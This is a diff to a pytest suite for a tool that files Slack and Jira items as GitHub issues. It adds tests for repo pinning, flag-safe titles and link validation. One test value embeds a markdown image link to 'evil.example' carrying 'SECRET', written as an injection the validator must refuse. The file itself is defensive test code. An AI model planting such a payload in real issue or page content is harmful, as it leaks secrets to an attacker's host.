@@ -4,7 +4,7 @@ import json
 import pytest
 
 from feeder import feed
-from feeder.feed import GhError, PlanError, check_plan, issue_body, keys_in, note_body, quiet, run
+from feeder.feed import GhError, PlanError, check_plan, issue_body, keys_in, note_body, quiet
 
 PLAN = {"repo": "acme/widgets", "owner": "Ada", "actions": [
     {"do": "create", "source": "slack", "key": "slack:C04ABC/1730800000.123456", "title": "Send Sam the numbers",
@@ -14,6 +14,11 @@ PLAN = {"repo": "acme/widgets", "owner": "Ada", "actions": [
     {"do": "maybe_done", "number": 14, "source": "jira", "key": "jira:PROJ-88:Done", "text": "PROJ-88 moved to Done.",
      "link": "https://acme.atlassian.net/browse/PROJ-88"},
 ]}
+
+
+def run(plan, gh, ledger, dry_run=False, **kw):
+    """feed.run with the team repo pinned to the test plans' repo."""
+    return feed.run(plan, gh, ledger, "acme/widgets", dry_run=dry_run, **kw)
 
 
 def _with(i, **change):
@@ -78,7 +83,7 @@ def test_quiet_stops_pings_and_forged_markers():
 def test_issue_body_opens_on_plain_words_and_ends_with_its_marker():
     body = issue_body(PLAN["actions"][0], "Ada")
     assert body.startswith("## In plain words\n\nSam asked for the numbers before Thursday.\n")
-    assert "## Where this came from\n\nSlack: https://acme.slack.com/archives/C04ABC/p1" in body
+    assert "## Where this came from\n\nSlack: <https://acme.slack.com/archives/C04ABC/p1>" in body
     assert "for Ada" in body and "never closes" in body
     assert body.rstrip().endswith("<!-- pomodo-source: slack:C04ABC/1730800000.123456 -->")
     assert keys_in(body) == {"slack:C04ABC/1730800000.123456"}
@@ -160,6 +165,21 @@ def test_a_failure_halfway_keeps_what_was_done_and_stops(tmp_path):
     assert done == [PLAN["actions"][0]["key"]]  # the create, not the comment or anything after it
 
 
+def test_lines_are_reported_as_they_happen_so_a_failure_keeps_them(tmp_path):
+    seen = []
+    with pytest.raises(GhError):
+        run(copy.deepcopy(PLAN), FakeGh(fail_on="comment"), tmp_path / "l.jsonl", on_line=seen.append)
+    assert seen == ['Done: opened #77 "Send Sam the numbers" (from Slack)']
+
+
+def test_main_prints_the_done_lines_before_it_stops(home, monkeypatch):
+    home.pin()
+    monkeypatch.setattr(feed, "gh_cli", FakeGh(fail_on="comment"))
+    code, err = home.main(json.dumps(PLAN))
+    assert code == 1 and err.startswith("Stopped: ")
+    assert home.out == 'Done: opened #77 "Send Sam the numbers" (from Slack)\n'
+
+
 def test_a_dry_run_reads_but_never_writes(tmp_path):
     gh = FakeGh()
     lines = run(copy.deepcopy(PLAN), gh, tmp_path / "ledger.jsonl", dry_run=True)
@@ -194,8 +214,10 @@ def test_the_title_goes_through_quiet(tmp_path):
     action = {**PLAN["actions"][0], "title": "Ask @sam <b>now</b>"}
     run({**PLAN, "actions": [action]}, gh, tmp_path / "l.jsonl")
     create = next(a for a in gh.writes() if a[:2] == ["issue", "create"])
-    assert create[create.index("--title") + 1] == quiet(action["title"])
-    assert "@sam" not in create[create.index("--title") + 1] and "<b>" not in create[create.index("--title") + 1]
+    title = next(x for x in create if x.startswith("--title="))
+    assert "--title" not in create  # one argument, so a title can never be read as a flag
+    assert title == "--title=" + quiet(action["title"])
+    assert "@sam" not in title and "<b>" not in title
 
 
 @pytest.mark.parametrize("i, field", [(0, "key"), (0, "link"), (1, "key"), (1, "link")])
@@ -266,12 +288,18 @@ class _Home:
         self.dir, self.capsys = tmp_path, capsys
         monkeypatch.setattr(feed.Path, "home", classmethod(lambda cls: tmp_path))
 
+    def pin(self, text="acme/widgets\n"):
+        self.state.mkdir(exist_ok=True)
+        (self.state / "repo").write_text(text)
+
     def main(self, plan_text, *extra):
         path = self.dir / "plan.json"
         if plan_text is not None:
             path.write_text(plan_text)
         code = feed.main([str(path), *extra])
-        return code, self.capsys.readouterr().err
+        out = self.capsys.readouterr()
+        self.out = out.out
+        return code, out.err
 
     @property
     def state(self):
@@ -301,13 +329,14 @@ def test_main_a_bad_plan_stops_before_the_state_folder_exists(home):
 
 
 def test_main_a_damaged_ledger_stops_plainly(home, monkeypatch):
-    home.state.mkdir()
+    home.pin()
     (home.state / "ledger.jsonl").write_text("not json\n")
     monkeypatch.setattr(feed, "gh_cli", FakeGh())
     _stopped(*home.main(json.dumps(PLAN)))
 
 
 def test_main_a_timeout_stops_plainly(home, monkeypatch):
+    home.pin()
     def slow(*a, **k):
         raise feed.subprocess.TimeoutExpired("gh", 60)
     monkeypatch.setattr(feed.subprocess, "run", slow)
@@ -315,6 +344,7 @@ def test_main_a_timeout_stops_plainly(home, monkeypatch):
 
 
 def test_main_a_missing_gh_stops_plainly(home, monkeypatch):
+    home.pin()
     def gone(*a, **k):
         raise FileNotFoundError("gh")
     monkeypatch.setattr(feed.subprocess, "run", gone)
@@ -322,11 +352,83 @@ def test_main_a_missing_gh_stops_plainly(home, monkeypatch):
 
 
 def test_main_an_unreadable_create_answer_stops_plainly(home, monkeypatch):
+    home.pin()
     monkeypatch.setattr(feed, "gh_cli", FakeGh(create_output="done\n"))
     _stopped(*home.main(json.dumps({**PLAN, "actions": [PLAN["actions"][0]]})))
 
 
 def test_main_a_good_plan_still_exits_zero(home, monkeypatch):
+    home.pin()
     monkeypatch.setattr(feed, "gh_cli", FakeGh())
     code, err = home.main(json.dumps(PLAN))
     assert code == 0 and err == "" and (home.state / "ledger.jsonl").exists()
+
+
+# --- final fix wave ---
+
+HOLE = "https://acme.slack.com/x)![a](https://evil.example/?q=SECRET)@kofi"
+
+
+@pytest.mark.parametrize("bad", [HOLE, "https://a.example/(x", "https://a.example/[x", "https://a.example/!x",
+                                 "https://a.example/@x", "https://a.example/*x", "https://a.example/`x"])
+def test_a_link_with_markdown_punctuation_is_refused(bad):
+    with pytest.raises(PlanError, match="link"):
+        check_plan(_with(0, link=bad))
+    with pytest.raises(PlanError, match="link"):
+        check_plan(_with(1, link=bad))
+
+
+def test_a_good_link_is_written_in_angle_brackets_in_both_bodies():
+    link = PLAN["actions"][0]["link"]
+    assert f"Slack: <{link}>" in issue_body(PLAN["actions"][0], "Ada")
+    assert f"<{PLAN['actions'][1]['link']}>" in note_body(PLAN["actions"][1])
+    assert f"<{PLAN['actions'][2]['link']}>" in note_body(PLAN["actions"][2])
+
+
+@pytest.mark.parametrize("source", [["slack"], {"a": 1}, 5, None])
+def test_a_source_of_the_wrong_type_is_a_plan_error(source):
+    with pytest.raises(PlanError, match="source"):
+        check_plan(_with(0, source=source))
+
+
+def test_main_a_source_that_is_a_list_stops_plainly(home):
+    _stopped(*home.main(json.dumps(_with(0, source=["slack"]))))
+
+
+def test_a_number_made_of_superscript_digits_is_not_a_number(tmp_path):
+    gh = FakeGh(create_output="https://github.com/acme/widgets/issues/\u00b2\n")
+    with pytest.raises(GhError, match="did not say its number"):
+        run({**PLAN, "actions": [PLAN["actions"][0]]}, gh, tmp_path / "l.jsonl")
+
+
+def test_a_plan_for_another_repo_is_refused_before_any_gh_call(tmp_path):
+    gh = FakeGh()
+    with pytest.raises(PlanError, match="acme/widgets.*other/private|other/private.*acme/widgets"):
+        feed.run({**PLAN, "repo": "other/private"}, gh, tmp_path / "l.jsonl", "acme/widgets")
+    assert gh.calls == []
+
+
+def test_the_pinned_repo_is_compared_ignoring_case(tmp_path):
+    gh = FakeGh()
+    feed.run(copy.deepcopy(PLAN), gh, tmp_path / "l.jsonl", "ACME/Widgets")
+    assert gh.writes()
+
+
+@pytest.mark.parametrize("text", [None, "", "\n  \n"])
+def test_main_without_the_pinned_repo_stops_and_says_how_to_set_it(home, monkeypatch, text):
+    if text is not None:
+        home.pin(text)
+    gh = FakeGh()
+    monkeypatch.setattr(feed, "gh_cli", gh)
+    code, err = home.main(json.dumps(PLAN))
+    _stopped(code, err)
+    assert "set the team repo first: echo owner/name > ~/.pomodo-feeder/repo" in err
+    assert gh.calls == []
+
+
+def test_main_refuses_a_plan_for_a_repo_other_than_the_pinned_one(home, monkeypatch):
+    home.pin("other/private")
+    gh = FakeGh()
+    monkeypatch.setattr(feed, "gh_cli", gh)
+    _stopped(*home.main(json.dumps(PLAN)))
+    assert gh.calls == []
